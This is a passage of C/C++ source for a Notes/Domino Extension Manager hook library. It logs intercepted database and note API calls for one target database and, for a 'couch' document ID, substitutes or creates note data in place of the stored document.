					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBREOPEN:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DBHANDLE far * db = VARARG_GET(ap, DBHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBREOPEN(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBREOPEN(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == db)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *db);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBOPENEXTENDED:
			break;
		case EM_NSFNOTEDECRYPT:
			break;
		case EM_NSFCONFLICTHANDLER:
			break;
		case EM_NSFNOTEUPDATEXTENDED:
			note = VARARG_GET(ap, NOTEHANDLE);

			hDb = (DBHANDLE)0;
			NSFNoteGetInfo(note, _NOTE_DB, &hDb);
			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				flags2 = VARARG_GET(ap, DWORD);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTEUPDATEXTENDED(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTEUPDATEXTENDED(");
				}
				sprintf(out, "%d, 0x%X)", note, flags2);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBCOMPACTEXTENDED:
			break;
		case EM_NIFGETCOLLECTIONDATA:
			coll = VARARG_GET(ap, HCOLLECTION);

			if (isInList(coll) == 0) {
				data = VARARG_GET(ap, DHANDLE far *);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFGETCOLLECTIONDATA(");
				}
				else {
					LogLine("-> AFTER EM_NIFGETCOLLECTIONDATA(");
				}
				sprintf(out, "%d, ", coll);
				LogLine(out);
				if (NULL == data)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *data);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBCOPYNOTE:
			break;
		case EM_NSFNOTECOPY:
			note = VARARG_GET(ap, NOTEHANDLE);

			hDb = (DBHANDLE)0;
			NSFNoteGetInfo(note, _NOTE_DB, &hDb);
			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				newnote = VARARG_GET(ap, NOTEHANDLE far *);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTECOPY(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTECOPY(");
				}
				sprintf(out, "%d, ", note);
				LogLine(out);
				if (NULL == newnote)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *newnote);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBCOPY:
			break;
		case EM_NSFDBCREATEANDCOPY:
			break;
		case EM_NSFDBCOPYACL:
			break;
		case EM_NSFDBCOPYTEMPLATEACL:
			break;
		case EM_NSFDBCREATEACLFROMTEMPLATE:
			break;
		case EM_NSFDBREADACL:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DHANDLE far * acl = VARARG_GET(ap, DHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBREADACL(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBREADACL(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == acl)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *acl);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBSTOREACL:
			break;
		case EM_NSFDBFILTER:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				NOTEHANDLE note = VARARG_GET(ap, NOTEHANDLE);
				DHANDLE tofilter = VARARG_GET(ap, DHANDLE);
				BOOL incr = VARARG_GET(ap, BOOL);
				void far * res1 = VARARG_GET(ap, void far *);
				void far * res2 = VARARG_GET(ap, void far *);
				char far * title = VARARG_GET(ap, char far *);
				void far * res3 = VARARG_GET(ap, void far *);
				void far * res4 = VARARG_GET(ap, void far *);
				DHANDLE del = VARARG_GET(ap, DHANDLE);
				DHANDLE sel = VARARG_GET(ap, DHANDLE);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBFILTER(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBFILTER(");
				}
				sprintf(out, "%d, %d, %ud, %d, <...>, <...>, ", hDb, note, tofilter, incr);
				LogLine(out);
				if (NULL == title)
					LogLine("NULL, ");
				else {
					sprintf(out, "%s, ", title);
					LogLine(out);
				}
				sprintf(out, "<...>, <...>, %ud, %ud)", del, sel);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_FTDELETEINDEX:
			break;
		case EM_NSFNOTEGETINFO:
			note = VARARG_GET(ap, NOTEHANDLE);

			hDb = (DBHANDLE)0;
			NSFNoteGetInfo(note, _NOTE_DB, &hDb);
			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				//sprintf(out, "EM_NSFNOTEGETINFO : %s - %s = %B\n", upath, targetDB);
				//LogLine(out);
				member = VARARG_GET(ap, WORD);
				ptr = VARARG_GET(ap, void far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTEGETINFO(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTEGETINFO(");
				}
				sprintf(out, "%d, %ud, ", note, member);
				LogLine(out);
				if (NULL == ptr)
					LogLine("NULL)");
				else
					LogLine("<...>)");
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFNOTESETINFO:
			note = VARARG_GET(ap, NOTEHANDLE);

			hDb = (DBHANDLE)0;
			NSFNoteGetInfo(note, _NOTE_DB, &hDb);
			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				member = VARARG_GET(ap, WORD);
				ptr = VARARG_GET(ap, void far *);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTESETINFO(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTESETINFO(");
				}
				sprintf(out, "%d, %ud, ", note, member);
				LogLine(out);
				if (NULL == ptr)
					LogLine("NULL)");
				else
					LogLine("<...>)");
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}
			break;
		case EM_NSFNOTECOMPUTEWITHFORM:
			note = VARARG_GET(ap, NOTEHANDLE);
			form = VARARG_GET(ap, NOTEHANDLE);
			flags2 = VARARG_GET(ap, DWORD);
			routine = VARARG_GET(ap, CWF_ERROR_PROC);
			context = VARARG_GET(ap, void *);

			gLogStream = fopen(LogFile, "a+");

			if (record->NotificationType == EM_BEFORE) {
				LogLine("-> BEFORE EM_NSFNOTECOMPUTEWITHFORM(");
			}
			else {
				LogLine("-> AFTER EM_NSFNOTECOMPUTEWITHFORM(");
			}
			sprintf(out, "%d, %d, 0x%X, ", note, form, flags2);
			LogLine(out);
			if (NULL == routine)
				LogLine("NULL, ");
			else
				LogLine("<...>, ");
			if (NULL == context)
				LogLine("NULL)");
			else
				LogLine("<...>)");
			if (record->NotificationType == EM_AFTER) {
				sprintf(out, " -> %d", record->Status);
				LogLine(out);
			}
			LogLine("\n");

			break;
		case EM_NIFFINDDESIGNNOTE:
		case EM_NIFFINDPRIVATEDESIGNNOTE:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				const char far * name = VARARG_GET(ap, const char far *);
				WORD cls = VARARG_GET(ap, WORD);
				NOTEID far * id = VARARG_GET(ap, NOTEID far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFFINDDESIGNNOTE(");
				}
				else {
					LogLine("-> AFTER EM_NIFFINDDESIGNNOTE(");
				}
				sprintf(out, "%d, %s, %ud, ", hDb, name, cls);
				LogLine(out);
				if (NULL == id)
					LogLine("NULL)");
				else {
					sprintf(out, "0x%X)", id);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NIFGETLASTMODIFIEDTIME:
			coll = VARARG_GET(ap, HCOLLECTION);

			if (isInList(coll) == 0) {
				data = VARARG_GET(ap, DHANDLE far *);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFGETLASTMODIFIEDTIME(");
				}
				else {
					LogLine("-> AFTER EM_NIFGETLASTMODIFIEDTIME(");
				}
				sprintf(out, "%d, ", coll);
				LogLine(out);
				if (NULL == data)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *data);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_FTSEARCHEXT:
			break;
		case EM_NAMELOOKUP:
			break;
		case EM_NIFFINDDESIGNNOTEEXT:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				const char far * name = VARARG_GET(ap, const char far *);
				WORD cls = VARARG_GET(ap, WORD);
				const char * flags = VARARG_GET(ap, const char *);
				NOTEID far * id = VARARG_GET(ap, NOTEID far *);
				DWORD options = VARARG_GET(ap, DWORD);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFFINDDESIGNNOTEEXT(");
				}
				else {
					LogLine("-> AFTER EM_NIFFINDDESIGNNOTEEXT(");
				}
				sprintf(out, "%d, %s, %ud, %s, ", hDb, name, cls, flags);
				LogLine(out);
				if (NULL == id)
					LogLine("NULL, ");
				else {
					sprintf(out, "0x%X, ", *id);
					LogLine(out);
				}
				sprintf(out, "%ul)", options);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NAMELOOKUP2:
			break;
		case EM_NSFNOTEOPENEXTENDED:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				NOTEID id = VARARG_GET(ap, NOTEID);
				DWORD flags = VARARG_GET(ap, DWORD);
				DWORD sequence = VARARG_GET(ap, DWORD);
				BYTE * key = VARARG_GET(ap, BYTE *);
				HANDLE * handle = VARARG_GET(ap, HANDLE *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTEOPENEXTENDED(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTEOPENEXTENDED(");
				}
				sprintf(out, "%d, 0x%X, 0x%X, %ul, <...>, ", hDb, id, flags, sequence);
				LogLine(out);
				if (NULL == id)
					LogLine("NULL)");
				else {
					sprintf(out, "0x%X)", *handle);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_TERMINATENSF:
			break;
		case EM_NSFMARKREAD:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				HANDLE note = VARARG_GET(ap, HANDLE);
				NOTEID id = VARARG_GET(ap, NOTEID);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFMARKREAD(");
				}
				else {
					LogLine("-> AFTER EM_NSFMARKREAD(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == note)
					LogLine("NULL, ");
				else
					LogLine("<...>, ");
				sprintf(out, "%ul)", id);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFADDTOFOLDER:
			break;
		case EM_NSFDBSPACEUSAGESCALED:
			break;
		case EM_NSFDBGETMAJMINVERSION:
			break;
		case EM_NSFNOTEEXTRACTWITHCALLBACK:
			break;
		case EM_NSFDBSTAMPNOTESMULTIITEM:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DHANDLE table = VARARG_GET(ap, DHANDLE);
				DHANDLE note = VARARG_GET(ap, DHANDLE);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBSTAMPNOTESMULTIITEM(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBSTAMPNOTESMULTIITEM(");
				}
				sprintf(out, "%d, %ud, %ud)", hDb, table, note);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBMODIFIEDTIMEBYNAME:
			break;
		case EM_NSFGETDBCHANGES:
			break;
		case EM_NSFDBNOTELOCK:
			break;
		case EM_NSFDBNOTEUNLOCK:
			break;
		default:
			break;
		}

		if (gLogStream) {
			fclose(gLogStream);
			gLogStream = (FILE *)0;
		}

		return ERR_EM_CONTINUE;
	}

	STATUS LNPUBLIC ProcessNoteOpen(EMRECORD FAR * exRecord) {
		STATUS error = NOERROR;
		VARARG_PTR ap;
		DBHANDLE hDB;
		NOTEHANDLE FAR * hNote;
		NOTEID id;
		WORD flags;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];
		int matchDB;

		try {
			// get function args
			ap = exRecord->Ap;

			//LogLine("-----------------------------------\n");
			hDB = (DBHANDLE)VARARG_GET(ap, DBHANDLE);
			id = (NOTEID)VARARG_GET(ap, NOTEID);
			flags = (WORD)VARARG_GET(ap, WORD);
			hNote = (NOTEHANDLE FAR *) VARARG_GET(ap, NOTEHANDLE FAR *);

			NSFDbPathGet(hDB, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (matchDB == 0) {
				gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");
				if (exRecord->NotificationType == EM_BEFORE) {
					LogLine("Intercepted before Note Open.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "ID: %X\n", id);
					LogLine(out);
					sprintf(out, "Flags: %X\n", flags);
					LogLine(out);
					if (*hNote)
						sprintf(out, "Note handle is: %X\n", *hNote);
					else
						sprintf(out, "Note handle is not defined\n");
					LogLine(out);
				}
				else {
					LogLine("Intercepted after Note Open.\n");
					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "ID: %X\n", id);
					LogLine(out);
					sprintf(out, "Flags: %X\n", flags);
					LogLine(out);
					if (*hNote)
						sprintf(out, "Note handle is: %X\n", *hNote);
					else
						sprintf(out, "Note handle is not defined\n");
					LogLine(out);
					STATUS status = exRecord->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
				}
				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in Open.\n");
		}
		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	STATUS LNPUBLIC ProcessNoteOpenUNID(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		VARARG_PTR ap;
		DBHANDLE hDB;
		NOTEHANDLE FAR * hNote;
		UNID FAR * unid;
		WORD flags;
		char  buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];
		int matchDB;

		try {
			// get function args
			ap = record->Ap;

			hDB = (DBHANDLE)VARARG_GET(ap, DBHANDLE);
			unid = (UNID FAR *) VARARG_GET(ap, UNID FAR *);
			flags = (WORD)VARARG_GET(ap, WORD);
			hNote = (NOTEHANDLE FAR *) VARARG_GET(ap, NOTEHANDLE FAR *);

			NSFDbPathGet(hDB, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			/*gLogStream = fopen(LogFile, "a+");
			LogLine("OPEN BY UNID!!!\n");
			sprintf(out, "matchDB = %d\n", matchDB);
			LogLine(out);
			sprintf(out, "targetDB = %s\n", targetDB);
			LogLine(out);
			sprintf(out, "db path = %s\n", upath);
			LogLine(out);*/

			//LogLine("-----------------------------------\n");
			if (matchDB == 0) {
				gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");
				if (record->NotificationType == EM_BEFORE) {
					LogLine("Intercepted after Note Open UNID.\n");
					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					TIMEDATE * dt = &(unid->Note);
					TIMEDATE * f = &(unid->File);
					sprintf(out, "UNID: 0x%08lx, 0x%08lx, 0x%08lx, 0x%08lx\n", f->Innards[0], f->Innards[1], dt->Innards[0], dt->Innards[1]);
					LogLine(out);
					sprintf(out, "Flags: %d\n", flags);
					LogLine(out);
					if (*hNote)
						sprintf(out, "Note handle is: %X\n", *hNote);
					else
						sprintf(out, "Note handle is not defined\n");
					LogLine(out);
				}
				else {
					LogLine("Intercepted after Note Open UNID.\n");
					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					TIMEDATE * dt = &(unid->Note);
					TIMEDATE * f = &(unid->File);
					sprintf(out, "UNID: 0x%08lx, 0x%08lx, 0x%08lx, 0x%08lx\n", f->Innards[0], f->Innards[1], dt->Innards[0], dt->Innards[1]);
					LogLine(out);
					sprintf(out, "Flags: %d\n", flags);
					LogLine(out);
					if (*hNote)
						sprintf(out, "Note handle is: %X\n", *hNote);
					else
						sprintf(out, "Note handle is not defined\n");
					LogLine(out);
					STATUS status = record->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
				}
				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in UNID.\n");
		}
		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	STATUS LNPUBLIC ProcessNoteOpenExt(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		VARARG_PTR ap;
		DBHANDLE hDB;
		NOTEHANDLE * hNote;
		NOTEID id;
		DWORD flags, sequence;
		BYTE * key;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];
		int matchDB;

		try {
			// get function args
			ap = record->Ap;

			hDB = (DBHANDLE)VARARG_GET(ap, DBHANDLE);
			id = (NOTEID)VARARG_GET(ap, NOTEID);
			flags = (DWORD)VARARG_GET(ap, DWORD);
			sequence = (DWORD)VARARG_GET(ap, DWORD);
			key = (BYTE *)VARARG_GET(ap, BYTE *);
			hNote = (NOTEHANDLE *)VARARG_GET(ap, NOTEHANDLE *);

			NSFDbPathGet(hDB, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			//LogLine("-----------------------------------\n");
			if (matchDB == 0) {
				gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");
				if (record->NotificationType == EM_BEFORE) {
					LogLine("Intercepted before Note Open Ext.\n");

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "ID: %X\n", id);
					LogLine(out);
					sprintf(out, "Flags: %X\n", flags);
					LogLine(out);
					sprintf(out, "Sequence: %X\n", sequence);
					LogLine(out);
					if (*hNote)
						sprintf(out, "Note handle is: %p\n", *hNote);
					else
						sprintf(out, "Note handle is not defined\n");
					LogLine(out);
				}
				else {
					LogLine("Intercepted after Note Open Ext.\n");
					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					sprintf(out, "ID: %X\n", id);
					LogLine(out);
					sprintf(out, "Flags: %X\n", flags);
					LogLine(out);
					sprintf(out, "Sequence: %X\n", sequence);
					LogLine(out);
					if (*hNote)
						sprintf(out, "Note handle is: %p\n", *hNote);
					else
						sprintf(out, "Note handle is not defined\n");
					LogLine(out);
					STATUS status = record->Status;
					sprintf(out, "Status: %X\n", status);
					LogLine(out);
					if (indexOfNoteID(id) != -1)
						HijackReplaceItems(*hNote);
					if (id == couchID) {
						if (NULL != hNote) {
							LogLine("Started faking note data...\n");
							HijackReplaceNote(*hNote);
							LogLine("Finished faking note data...\n");
						}
					}
				}
				LogLine("-----------------------------------\n");
				if (gLogStream) {
					fclose(gLogStream);
					gLogStream = (FILE *)0;
				}
			}
		}
		catch (int e) {
			error = e;
			LogLine("Error in Ext.\n");
		}
		if (NOERROR == error)
			return ERR_EM_CONTINUE;
		else
			return error;
	}

	STATUS LNPUBLIC ProcessDbGetNoteInfoByUnid(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		STATUS err = NOERROR;
		int matchDB;
		VARARG_PTR ap;
		DBHANDLE hDb;
		UNID far *unid;
		OID far *oid, *bufoid;
		NOTEID far *noteid, *bufnoteid, *chknoteid;
		TIMEDATE far *modTime, *bufModTime;
		WORD far * nClass, *bufNClass;
		DHANDLE far * hNote;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];
		char far form[] = "Form", formname[] = "test", lformname[2 * MAX_PATH + 1];

		try {
			// get function args
			ap = record->Ap;
			hDb = (DBHANDLE)VARARG_GET(ap, DBHANDLE);
			unid = (UNID far *)VARARG_GET(ap, UNID far *);
			noteid = (NOTEID far *)VARARG_GET(ap, NOTEID far *);
			oid = (OID far *)VARARG_GET(ap, OID far *);
			modTime = (TIMEDATE far *)VARARG_GET(ap, TIMEDATE far *);
			nClass = (WORD far *)VARARG_GET(ap, WORD far *);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			matchDB = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (matchDB == 0 && isCouchUNID(unid)) {
				gLogStream = fopen(LogFile, "a+");
				LogLine("-----------------------------------\n");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("Intercepted before Db Get Note Info by UNID.\n");
					err = NSFDbGetNoteInfoByUNID(hDb, unid, &couchID, NULL, NULL, NULL);
					sprintf(out, "err: %X\n", err);
					LogLine(out);
					if (err == ERR_NOT_FOUND) {
						LogLine("Faking note\n");
						// spawn document
						hNote = (NOTEHANDLE *)malloc(sizeof(NOTEHANDLE));
						OSMemAlloc(MEM_SHARE | MEM_GROWABLE, (DWORD)5, hNote);
						NSFNoteCreate(hDb, hNote);
						bufoid = (OID *)malloc(sizeof(OID));
						NSFNoteGetInfo(*hNote, _NOTE_OID, bufoid);
						memcpy(&(bufoid->File), &(unid->File), sizeof(DBID));
						memcpy(&(bufoid->Note), &(unid->Note), sizeof(TIMEDATE));
						NSFNoteSetInfo(*hNote, _NOTE_OID, bufoid);
						bufNClass = (WORD *)malloc(sizeof(WORD));
						*bufNClass = NOTE_CLASS_DOCUMENT;
						NSFNoteSetInfo(*hNote, _NOTE_CLASS, bufNClass);
						//OSTranslate(OS_TRANSLATE_NATIVE_TO_LMBCS, formname, strlen(formname), lformname, sizeof(lformname));
						//sprintf(out, "%s(%d):%s(%d)\n", formname, strlen(formname), lformname, strlen(lformname));
						//LogLine(out);
						//NSFItemCreateTextList(*hNote, form, lformname, strlen(lformname));
						NSFItemAppend(*hNote, ITEM_SUMMARY, "Form", strlen("Form"), TYPE_TEXT, "test", (DWORD)strlen("test"));
						err = NSFNoteUpdateExtended(*hNote, UPDATE_FORCE);
						if (err) {
							sprintf(out, "FAKING NOTE FAILED: %d - ", err);
							LogLine(out);
							OSLoadString(NULLHANDLE, ERR(err), out, sizeof(out) - 1);
							LogLine(out);
							LogLine("\n");
						}
					}
					else {
						sprintf(out, "Couch ID: %X", couchID);
					}
					//NSFNoteGetInfo(*hNote, _NOTE_ID, &couchID);

					LogLine("Info: \n");
					sprintf(out, "DB Path: %s\n", buf2);
					LogLine(out);
					if (NULL != unid) {
						TIMEDATE * nt = &(unid->Note);
						TIMEDATE * f = &(unid->File);
						sprintf(out, "UNID: OF - 0x%08lx:0x%08lx; ON - 0x%08lx:0x%08lx\n", f->Innards[0], f->Innards[1], nt->Innards[0], nt->Innards[1]);
						LogLine(out);
					}
					else LogLine("UNID is NULL\n");
					if (NULL != noteid) {
						sprintf(out, "Note ID: %X\n", *noteid);
						LogLine(out);
					}
					else LogLine("Note ID is NULL\n");
					if (NULL != oid) {
						sprintf(out, "Originator ID: %X\n", *oid);
						LogLine(out);
					}
					else LogLine("Originator ID is NULL\n");
					if (NULL != modTime) {
						sprintf(out, "Mod Time: 0x%08lx:0x%08lx\n", modTime->Innards[0], modTime->Innards[1]);
						LogLine(out);
					}
					else LogLine("modTime is NULL\n");
					if (NULL != nClass) {
						sprintf(out, "Note Class: %X\n", *nClass);
						LogLine(out);
					}
					else LogLine("Note Class is NULL\n");
				}
				else {
					LogLine("Intercepted after Db Get Note Info by UNID.\n");
					LogLine("Substituting...\n");
					/*NSFDbCreateNoteID(hDb, TRUE, noteid);
					couchID = *noteid;
					if (NULL != oid)
						oid = (ORIGINATORID *)malloc(sizeof(ORIGINATORID));
					NSFDbGenerateOID(hDb, oid);
					memcpy(&(oid->File), &(unid->File), sizeof(DBID));
